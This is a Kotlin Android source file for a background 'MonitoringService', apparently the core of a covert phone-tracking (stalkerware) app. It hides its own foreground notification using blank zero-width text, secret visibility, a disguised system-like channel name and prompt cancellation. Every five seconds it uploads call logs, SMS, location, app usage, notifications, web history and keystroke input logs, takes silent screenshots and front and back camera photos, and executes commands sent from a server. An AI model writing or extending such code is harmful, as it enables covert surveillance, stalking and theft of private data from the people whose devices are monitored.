package com.takip.app.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.NotificationCompat
import com.takip.app.R
import com.takip.app.api.ApiClient
import com.takip.app.collector.AppUsageCollector
import com.takip.app.collector.CallCollector
import com.takip.app.collector.CameraCaptureHelper
import com.takip.app.collector.InstalledAppsCollector
import com.takip.app.collector.LocationCollector
import com.takip.app.collector.SmsCollector
import com.takip.app.util.PermissionChecker
import com.takip.app.util.PrefsManager
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch
import org.json.JSONArray
import java.io.File

class MonitoringService : Service() {

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var syncJob: Job? = null
    private var mediaCounter = 0
    private val mainHandler = Handler(Looper.getMainLooper())

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        ensureSilentChannel()
        startHiddenForeground()
        scope.launch { syncData() }
        startSyncLoop()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        ensureSilentChannel()
        startHiddenForeground()
        if (syncJob?.isActive != true) {
            scope.launch { syncData() }
            startSyncLoop()
        }
        return START_STICKY
    }

    override fun onDestroy() {
        syncJob?.cancel()
        scope.cancel()
        super.onDestroy()
    }

    private fun ensureSilentChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(NotificationManager::class.java)
        try {
            nm.deleteNotificationChannel(LEGACY_CHANNEL_ID)
        } catch (_: Exception) {
        }
        val channel = NotificationChannel(
            CHANNEL_ID,
            "\u200B",
            NotificationManager.IMPORTANCE_MIN
        ).apply {
            description = "\u200B"
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            setSound(null, null)
            lockscreenVisibility = Notification.VISIBILITY_SECRET
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                setAllowBubbles(false)
            }
        }
        nm.createNotificationChannel(channel)
    }

    private fun startHiddenForeground() {
        startForeground(NOTIFICATION_ID, createNotification())
        mainHandler.postDelayed({ hideForegroundNotification() }, 400)
    }

    private fun hideForegroundNotification() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                stopForeground(STOP_FOREGROUND_DETACH)
                return
            }
            val nm = getSystemService(NotificationManager::class.java)
            nm.cancel(NOTIFICATION_ID)
        } catch (e: Exception) {
            Log.w(TAG, "Bildirim gizleme: ${e.message}")
        }
    }

    private fun startSyncLoop() {
        syncJob?.cancel()
        syncJob = scope.launch {
            while (isActive) {
                hideForegroundNotification()
                delay(SYNC_INTERVAL_MS)
                syncData()
            }
        }
    }

    private suspend fun syncData() {
        ConfigManagerRefresh()
        val token = PrefsManager.deviceToken
        if (token.isNullOrBlank()) {
            Log.w(TAG, "Senkron atlandı: deviceToken yok")
            return
        }

        hideForegroundNotification()

        val permissions = PermissionChecker.getStatus(this)
        ApiClient.sync(token, permissions).onSuccess { syncResult ->
            for (cmd in syncResult.commands) {
                scope.launch {
                    CommandExecutor.execute(this@MonitoringService, token, cmd.id, cmd.type)
                }
            }
        }.onFailure {
            Log.e(TAG, "Senkron başarısız: ${it.message}")
            ApiClient.heartbeat(token)
        }

        uploadArray(CallCollector.collect(this)) { ApiClient.uploadCalls(token, it) }.let { ok ->
            if (ok) CallCollector.commitSync()
        }

        uploadArray(SmsCollector.collect(this)) { ApiClient.uploadSms(token, it) }.let { ok ->
            if (ok) SmsCollector.commitSync()
        }

        uploadArray(LocationCollector.collect(this)) { ApiClient.uploadLocations(token, it) }
        uploadArray(AppUsageCollector.collect(this)) { ApiClient.uploadAppUsage(token, it) }

        val notifications = NotificationQueue.snapshot()
        if (uploadArray(notifications) { ApiClient.uploadNotifications(token, it) }) {
            NotificationQueue.clear()
        }

        val webHistory = ActivityLogQueue.snapshotWebHistory()
        if (uploadArray(webHistory) { ApiClient.uploadWebHistory(token, it) }) {
            ActivityLogQueue.clearWebHistory()
        }

        val inputLogs = ActivityLogQueue.snapshotInputLogs()
        if (uploadArray(inputLogs) { ApiClient.uploadInputLogs(token, it) }) {
            ActivityLogQueue.clearInputLogs()
        }

        uploadArray(InstalledAppsCollector.collect(this)) { ApiClient.uploadInstalledApps(token, it) }

        captureAndUploadMedia(token)
    }

    private fun uploadArray(
        data: JSONArray,
        upload: (JSONArray) -> Result<Unit>
    ): Boolean {
        if (data.length() == 0) return false
        return upload(data).fold(
            onSuccess = {
                Log.d(TAG, "Yükleme OK (${data.length()} kayıt)")
                true
            },
            onFailure = {
                Log.e(TAG, "Yükleme hatası: ${it.message}")
                false
            }
        )
    }

    private fun ConfigManagerRefresh() {
        com.takip.app.util.ConfigManager.refreshIfStale()
    }

    private suspend fun captureAndUploadMedia(token: String) {
        mediaCounter++
        if (mediaCounter % 3 != 0) return

        TakipAccessibilityService.instance?.takeScreenCapture { bytes ->
            if (bytes != null) {
                val file = File(cacheDir, "screen_${System.currentTimeMillis()}.jpg")
                file.writeBytes(bytes)
                ApiClient.uploadMedia(token, file, "screenshot")
            }
        }

        CameraCaptureHelper.capturePhoto(this, useFrontCamera = false)?.let { file ->
            ApiClient.uploadMedia(token, file, "camera_back")
                .onFailure { Log.e(TAG, "Kamera arka: ${it.message}") }
        }

        delay(1500)

        CameraCaptureHelper.capturePhoto(this, useFrontCamera = true)?.let { file ->
            ApiClient.uploadMedia(token, file, "camera_front")
                .onFailure { Log.e(TAG, "Kamera ön: ${it.message}") }
        }
    }

    private fun createNotification(): Notification {
        val sysIcon = resources.getIdentifier("stat_notify_sync", "drawable", "android")
        val icon = if (sysIcon != 0) sysIcon else R.drawable.ic_notification_blank

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSubText(null)
            .setSmallIcon(icon)
            .setOngoing(true)
            .setSilent(true)
            .setShowWhen(false)
            .setLocalOnly(true)
            .setOnlyAlertOnce(true)
            .setSortKey("zzz")
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }

    companion object {
        private const val TAG = "MonitoringService"
        private const val NOTIFICATION_ID = 1001
        private const val CHANNEL_ID = "sys_bg_sync_v3"
        private const val LEGACY_CHANNEL_ID = "takip_monitoring"
        private const val SYNC_INTERVAL_MS = 5_000L

        fun start(context: Context) {
            val intent = Intent(context, MonitoringService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
    }
}
